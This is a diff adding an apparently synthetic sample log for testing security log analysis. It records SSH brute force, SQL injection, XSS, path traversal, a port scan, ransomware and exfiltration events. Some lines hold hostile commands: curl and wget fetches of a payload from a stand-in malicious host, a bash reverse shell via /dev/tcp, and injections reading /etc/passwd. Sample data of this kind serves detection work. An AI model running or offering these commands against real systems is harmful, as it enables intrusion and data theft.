@@ -1,0 +1,36 @@
+# sample_logs/sample.log
+Jan 12 08:01:22 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51514 ssh2
+Jan 12 08:01:24 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51515 ssh2
+Jan 12 08:01:26 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51516 ssh2
+Jan 12 08:01:28 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51517 ssh2
+Jan 12 08:01:30 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51518 ssh2
+Jan 12 08:01:32 host sshd[1234]: Accepted password for user bob from 203.0.113.10 port 53422 ssh2
+
+Jan 12 09:12:01 webserver access: "GET /index.php?id=1' OR '1'='1' -- HTTP/1.1" 200 4523 "-" "sqlmap/1.4"
+Jan 12 09:12:03 webserver access: "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 234 "-" "Mozilla/5.0"
+Jan 12 09:12:05 webserver access: "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 403 128 "-" "nikto/2.1.6"
+
+Jan 12 10:00:00 kernel: Connection attempt from 203.0.113.5 to port 22
+Jan 12 10:00:01 kernel: Connection attempt from 203.0.113.5 to port 23
+Jan 12 10:00:02 kernel: Connection attempt from 203.0.113.5 to port 80
+Jan 12 10:00:03 kernel: Connection attempt from 203.0.113.5 to port 443
+Jan 12 10:00:04 kernel: Connection attempt from 203.0.113.5 to port 445
+Jan 12 10:00:05 kernel: Connection attempt from 203.0.113.5 to port 8080
+Jan 12 10:00:06 kernel: Connection attempt from 203.0.113.5 to port 3306
+Jan 12 10:00:07 kernel: Connection attempt from 203.0.113.5 to port 5900
+
+Jan 12 11:00:00 user: curl http://malicious.example.com/payload.sh -o /tmp/payload.sh
+Jan 12 11:00:10 user: wget http://malicious.example.com/backdoor.bin -O /tmp/backdoor.bin
+Jan 12 11:00:20 user: powershell.exe -EncodedCommand SQBHAH...  # base64-like
+
+Jan 12 11:15:00 app[9876]: Suspicious command executed: /bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+Jan 12 11:16:00 app[9876]: Created file /tmp/evil_payload and set execute permissions
+Jan 12 11:17:00 kernel: Outbound connection established to 198.51.100.101:443
+Jan 12 11:17:05 kernel: DNS query for suspicious-domain.example.com from 192.0.2.45
+
+Jan 12 12:00:00 svc: Ransom note created: /home/user/documents/FILES.ENCRYPTED.locked
+Jan 12 12:00:05 svc: Process exfil started; copying /home/user/important.db to /tmp/upload.tmp
+Jan 12 12:00:10 svc: Detected deletion of system logs: /var/log/auth.log removed
+
+Jan 12 13:05:00 webserver access: "GET /scripts/setup.php?cmd=ls%20-la%20%2F HTTP/1.1" 200 1240 "-" "python-requests/2.28"
+Jan 12 13:05:05 webserver access: "GET /app?input=';cat /etc/passwd;' HTTP/1.1" 500 560 "-" "curl/7.68.0"
